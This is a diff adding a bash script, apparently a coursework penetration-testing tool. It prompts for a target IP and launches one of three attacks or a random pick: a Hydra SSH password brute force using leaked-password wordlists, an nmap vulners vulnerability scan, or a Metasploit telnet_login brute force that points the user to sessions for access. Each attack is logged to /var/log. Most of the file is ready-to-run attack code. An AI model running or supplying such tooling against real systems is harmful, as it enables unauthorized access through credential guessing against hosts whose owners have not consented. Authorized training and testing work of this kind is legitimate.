@@ -1,0 +1,161 @@
+#!bin/bash
+
+# 1)Author: Zulkarnaen
+# 2)Date created: 24/5/2024
+# 3)Date modified: 24/5/2024
+
+# 4)Description: 
+# Runs a pen test script that allows user to input target IP to attack.
+# User is able to choose from a list of 3 attack types or choose randomly.
+# After attack type is selected, attack information will be saved into a log file in /var/log .
+# Attack information includes type of attack, time of execution and IP address.
+# Script requires sudo privileges.
+
+# 5)Usage: S3.sh
+#------------------------------------------------------------------------------------------------------
+
+# 3 different attack types
+# Each attack should have a description to display once chosen
+# Display a list of all possible attacks with descriptions
+# The user can choose a specific attack or random from the list
+# If the user enters a different key, display a message and exit
+# On attack selection, save it into a log file in /var/log
+# The log should hold the kind of attack, time of execution, and IP addresses
+#------------------------------------------------------------------------------------------------------
+
+
+#Functions
+
+timestamp=$(date +"%Y-%m-%d %H:%M:%S")
+
+#------------------------------------------------------------------------------------------------------
+# Attack selection function
+function attack()
+
+{
+
+echo 'Select an attack type (#). 
+1 = Hydra brute force attack on ssh port (brute force passwords of various network services)
+2 = Scan attack (Nmap Scripting Engine (NSE), service version, and vulnerability analysis scan)
+3 = Telnet attack (exploit the network through telnet port)
+4 = Random attack
+5 = Quit.'
+	
+	read -r opt
+
+            case $opt in
+                1)	echo 'You selected Hydra attack'
+                    hydra_attk
+                    ;;
+                2)	echo 'You selected Scan attack'
+                    scan_attk
+                    ;;
+                3)	echo 'You selected Telnet attack'
+                    telnet_attk
+                    ;;
+                4)	echo 'You selected Random attack'
+                    rand_attk
+                    ;;
+                  
+                5)	echo 'You selected Quit'
+                    echo "Exiting..."
+                    exit 0
+                    ;;
+                *)
+                    echo "You selected an invalid option. Please try again."
+                    ;;
+            esac
+ 
+}
+#------------------------------------------------------------------------------------------------------
+# Hydra attack function
+function hydra_attk()
+{
+	echo 'Hydra is a powerful tool for brute-forcing passwords of various network services'
+	echo 'Enter the target IP: '
+	read IP_1
+	echo 'Enter the target port: '
+	read P_1
+    
+    hydra -L top-usernames-shortlist.txt -P darkweb2017-top100.txt $IP_1 ssh $P_1
+	
+	echo "[$timestamp] Attack type: Hydra brute-force attack" >> /var/log/hydra_attack.log
+	echo "[$timestamp] Target IP & Port: $IP_1 & $P_1" >> /var/log/hydra_attack.log
+	echo "[$timestamp] Start Hydra attack" >> /var/log/hydra_attack.log
+	
+}
+#------------------------------------------------------------------------------------------------------
+# Scan attack function
+function scan_attk()
+{
+	
+	echo 'Scanning for vulnerability and service version of user selected IP address'
+	echo 'Enter the target IP: '
+	read IP_2
+	nmap $IP_2 --script vulners -sV
+	
+	echo "[$timestamp] Attack type: Scan attack" >> /var/log/scan_attack.log
+	echo "[$timestamp] Target IP: $IP_2" >> /var/log/scan_attack.log
+	echo "[$timestamp] Start Scan attack" >> /var/log/scan_attack.log
+	
+}
+#------------------------------------------------------------------------------------------------------
+# telnet attack function
+function telnet_attk()
+{
+	echo 'This module will test a telnet login on a range of machines and
+report successful logins.  If you have loaded a database plugin
+and connected to a database this module will record successful
+logins and hosts so you can track your access.'
+		  
+	echo 'Enter the target IP: '
+	read rhost 
+    
+    echo 'Once scan is complete, use sessions command to gain access into the target or exit -y to exit msfconsole'
+    
+    echo 'use auxiliary/scanner/telnet/telnet_login' >> telnet.rc
+    echo 'set pass_file darkweb2017-top100.txt' >> telnet.rc
+    echo "set rhosts $rhost" >> telnet.rc
+    echo 'set user_file top-usernames-shortlist.txt' >> telnet.rc
+    echo 'set verbose false' >> telnet.rc
+    echo 'set stop_on_success true' >> telnet.rc
+    echo 'run' >> telnet.rc
+    
+    echo "[$timestamp] Attack type: Telnet attack" >> /var/log/telnet_attack.log
+	echo "[$timestamp] Target IP: $rhost" >> /var/log/telnet_attack.log
+	echo "[$timestamp] Start Telnet attack" >> /var/log/telnet_attack.log
+	
+    msfconsole -qr telnet.rc
+    
+  
+    
+    
+   
+ }   
+    
+    
+#------------------------------------------------------------------------------------------------------
+# random attack function  
+function rand_attk() 
+{
+    rand=$((RANDOM % 3 + 1))
+    case $rand in
+    1)
+        hydra_attk
+        ;;
+    2)
+        scan_attk
+        ;;
+    3)
+        telnet_attk
+        ;;
+    esac
+}
+
+
+#-----------------------------------------------------------------------------------
+# Start of script
+
+attack
+
+
